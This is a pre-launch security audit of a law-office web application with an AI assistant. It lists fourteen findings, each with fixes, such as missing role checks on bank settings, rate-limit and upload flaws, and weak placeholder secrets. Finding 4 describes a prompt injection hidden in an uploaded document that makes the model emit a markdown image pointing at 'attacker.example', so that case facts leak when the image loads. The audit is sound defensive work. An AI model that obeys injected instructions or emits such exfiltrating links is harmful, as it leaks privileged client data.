# Pre-launch Security Audit — 2026-10-16

**Scope:** source review of `main` at `5347085` (API, web, shared libs, seeds, local infra), plus `npm audit --omit=dev`.
**Not in scope:** live penetration test, production hosting/proxy configuration (none is checked into the repo), third-party provider contracts.

Severity reflects impact for a law office holding privileged client data and issuing invoices.

| #   | Finding                                                        | Severity   | Effort |
| --- | -------------------------------------------------------------- | ---------- | ------ |
| 1   | Any member can change bank accounts and the SEF API key        | High       | Small  |
| 2   | Rate limits collapse to one shared bucket behind a proxy       | High       | Small  |
| 3   | Chat uploads are buffered in memory with no size limit         | High       | Small  |
| 4   | Assistant markdown renders remote images (data exfiltration)   | High       | Small  |
| 5   | `.env.example` placeholders pass production validation         | High       | Small  |
| 6   | Vulnerable production dependencies (1 critical, 10 high)       | High       | Medium |
| 7   | No security headers (HSTS, CSP, nosniff, frame-ancestors)      | Medium     | Small  |
| 8   | "Clear conversation history" silently deletes nothing          | Medium     | Small  |
| 9   | CSRF guard accepts state-changing requests without `Origin`    | Medium     | Small  |
| 10  | Flat workspace visibility; any member approves others' actions | Decision   | —      |
| 11  | `xmllint` runs synchronously on the request thread             | Low        | Small  |
| 12  | Login timing reveals whether an email exists                   | Low        | Small  |
| 13  | Local Compose credentials and open ports                       | Ops        | —      |
| 14  | Client data sent to OpenRouter / model providers               | Compliance | —      |

---

## Must fix before go-live

### 1. Any member can change bank accounts and the SEF API key

`libs/api/features/financials/src/lib/organization-settings.controller.ts:31` uses `@WorkspaceAccess()` with no role, and `OrganizationSettingsService` has no role check (unlike `FinancialsService`, `PaymentsService`, `BillingSetupService`, which call `assertManager()`).

**Impact:** a MEMBER account (trainee, office desk, or any compromised account) can:

- replace the bank account / IBAN printed on invoices and payment QR codes — direct payment-fraud risk;
- replace or delete the SEF API key, change company PIB/tax data, invoice numbering.

**Fix:** require `WorkspaceRole.ADMIN` on every write route (keep `GET` readable if the UI needs it), or `assertManager()` in each service write. Add controller/service tests for the MEMBER and LAWYER roles.

### 2. Rate limits collapse to one shared bucket behind a proxy

`apps/api/src/main.ts` never sets Express `trust proxy`. `AuthRateLimitGuard` keys on `request.ip` (`libs/api/features/auth/src/lib/rate-limit.guard.ts:30`) with a limit of 5/minute.

**Impact:** behind nginx / a load balancer every request has the proxy's IP. The whole office shares 5 login, 5 password-reset and 5 MFA-verify attempts per minute; anyone on the internet can lock everyone out continuously.

**Fix:** `app.getHttpAdapter().getInstance().set("trust proxy", <exact hop count>)` driven by an env var (never `true`). Upgrade `proxy-addr` first (finding 6). Consider adding a per-account login failure counter alongside the per-IP one.

### 3. Chat uploads are buffered in memory with no size limit

`libs/api/features/chat/src/lib/chat.module.ts:55` registers `memoryStorage()` with no `limits`; `chat.controller.ts:222` uses `FilesInterceptor("files", 5)`. `UPLOAD_MAX_BYTES` is only checked in `chat.service.ts:1504`, after the whole file is in memory.

**Impact:** one authenticated user posting five very large files can exhaust API memory and take the service down. (Workspace document uploads stream to disk with a byte cap and are not affected.)

**Fix:** `MulterModule.register({ storage: memoryStorage(), limits: { fileSize: UPLOAD_MAX_BYTES, files: CHAT_MAX_FILES_PER_MESSAGE } })`; also cap request size at the proxy.

### 4. Assistant markdown renders remote images (data exfiltration)

`apps/web/src/app/features/assistant/assistant-markdown.pipe.ts:21` renders model output with `marked`, then Angular's HTML sanitizer, which keeps `<img src="https://…">`.

**Impact:** prompt injection hidden in an uploaded document (e.g. from opposing counsel) can make the model emit `![](https://attacker.example/?d=<case facts>)`. The browser fetches it automatically — confidential data leaves without any click.

**Fix:** drop images (or allow only same-origin) in the marked renderer; restrict `img-src` in the CSP (finding 7). Optionally mark external links `rel="noopener noreferrer"` and show the target domain.

### 5. `.env.example` placeholders pass production validation

`apps/api/src/app/config.validation.ts:47,55` only require 32 characters. The placeholder `replace-with-at-least-32-random-characters` is 41 characters, so it passes for `ORGANIZATION_SECRETS_KEY` and `AUTH_MFA_ENCRYPTION_KEY`. The bootstrap password placeholder (35 characters) passes `apps/api/prisma/seed.cjs:21`.

**Impact:** a deployment from a copied `.env` uses publicly known encryption keys and a publicly known admin password.

**Fix:** in production, reject any value containing `replace-with`; make the seed refuse the placeholder password unconditionally.

### 6. Vulnerable production dependencies

`npm audit --omit=dev`: 1 critical, 10 high, 9 moderate.

| Package                               | Severity | Relevance                                                                                                                                                                                               |
| ------------------------------------- | -------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `proxy-addr` ≤ 2.0.7                  | Critical | IP spoofing once `trust proxy` is configured (finding 2)                                                                                                                                                |
| `multer` / `@nestjs/platform-express` | High     | Upload DoS, size-limit bypass — used for chat and avatar uploads                                                                                                                                        |
| `nodemailer` ≤ 10.0.8                 | High     | Auth mail (invites, resets, MFA codes)                                                                                                                                                                  |
| `axios` ≤ 1.19.0                      | High     | SSRF/header-injection gadgets in outbound requests                                                                                                                                                      |
| `prisma` / `@prisma/config`           | High     | Transitive (`effect`, `deepmerge-ts`)                                                                                                                                                                   |
| `xlsx` 0.18.5                         | High     | Prototype pollution / ReDoS; parses **uploaded** spreadsheets in `libs/api/ai/extraction/src/lib/spreadsheet-extractor.ts`. No fixed npm release — move to SheetJS 0.20.x (vendor tarball) or `exceljs` |
| `@angular/router` < 22.2              | High     | SSR-only DoS; the app does not use SSR, but upgrade anyway                                                                                                                                              |

**Fix:** upgrade, re-run `npm audit --omit=dev`, and add it to CI.

### 7. No security headers

The API does not use `helmet`, and the repo has no hosting/proxy config for the web app.

**Fix (proxy or `helmet`):**

- `Strict-Transport-Security: max-age=31536000; includeSubDomains`
- `Content-Security-Policy`: `default-src 'self'`; `img-src 'self' data: blob:`; `connect-src 'self'` (+ API origin); `frame-ancestors 'none'`; `object-src 'none'`; `base-uri 'self'`
- `X-Content-Type-Options: nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`
- `AUTH_FRONTEND_ORIGIN` must be `https://` in production (validate it).

---

## Should fix

### 8. "Clear conversation history" silently deletes nothing

`libs/api/features/user-settings/src/lib/user-settings.controller.ts:90` has `CsrfOriginGuard, AuthGuard` but no `WorkspaceAccessGuard`, so `request.workspace` is never set and the handler always returns `{ deleted: 0 }`. Users believe their chats are gone. Add the guard (or use `HARDCODED_WORKSPACE_ID`) and a test.

### 9. CSRF guard accepts requests without `Origin`

`libs/api/features/auth/src/lib/csrf.guard.ts:20` returns `true` when `Origin` is absent. Today only `SameSite=Lax` on `law_session` protects state-changing requests. Require `Origin` (or `Sec-Fetch-Site: same-origin|same-site`) on POST/PUT/PATCH/DELETE.

### 10. Flat workspace visibility (product decision)

Every active member can read every chat session, document, SSE workspace event, and can approve/decline another user's pending assistant action (`approve`/`decline` check workspace only; `undo` checks the conversation owner). This matches the single-workspace design, but a law office may need ethical walls for conflicted matters and owner-only approval. Decide explicitly and document it.

### 11. `xmllint` blocks the event loop

`libs/api/features/financials/src/lib/sef-invoice-validator.ts:164` uses `spawnSync` with a 10 s timeout on the request path. Switch to async `spawn`/`execFile`.

### 12. Login timing user enumeration

`libs/api/features/auth/src/lib/auth.service.ts:123` skips scrypt when the email is unknown, so responses are measurably faster. Verify against a fixed dummy hash.

---

## Operations and compliance

### 13. Local infra is not a production template

`infra/docker/compose.yml` uses `law`/`law` Postgres credentials, Redis without a password, and publishes 5432/6379/1025/8025. Production needs unique credentials, Redis `requirepass`/ACL + TLS where networked, and no public DB/Redis ports. Mailpit must not run in production.

### 14. Client data to LLM providers

Assistant prompts, documents and drafts are sent to OpenRouter and its upstream providers. For privileged client data and Serbian data-protection law (ZZPL): restrict OpenRouter to zero-data-retention providers, have a DPA in place, and record it. `MASTRA_TRACING` is correctly off by default — keep it off in production unless the trace store is covered too.

---

## Verified as sound

- Passwords hashed with scrypt; constant-time comparison.
- Session, reset and invitation tokens: 256-bit random, only SHA-256 hashes stored; single-use claims are atomic.
- Session rotation with token-family reuse detection; password change/reset revokes sessions and trusted devices.
- MFA: encrypted TOTP secrets, replay guard on time step, per-account failure throttle, owner protected from admin reset.
- Every business query scoped by `workspaceId`; `WorkspaceAccessGuard` on all business controllers.
- Role checks present for invoices, payments, billing setup, profitability, month-end (owner only), revenue sharing, references admin, draft approval.
- Global `ValidationPipe` with `whitelist` + `forbidNonWhitelisted`.
- File storage rejects traversal and symlink escape; avatar names are unguessable; content type is sniffed.
- Raw SQL is parameterized; sort columns are allow-listed.
- Auth email templates HTML-escape all values; links use the configured origin, not the `Host` header.
- Assistant record changes go through `PendingAction`; AUTO mode is opt-in, never skips warnings, and is undoable for 24 h.

## Recommended order

1. Findings 1, 3, 5, 8 — small code fixes with tests (one PR).
2. Findings 2 + 6 — dependency upgrades and `trust proxy` together.
3. Finding 4 + 7 — markdown image policy and headers/CSP (test the app under the CSP).
4. Findings 9, 11, 12.
5. Decisions 10, 13, 14 before onboarding real client data.
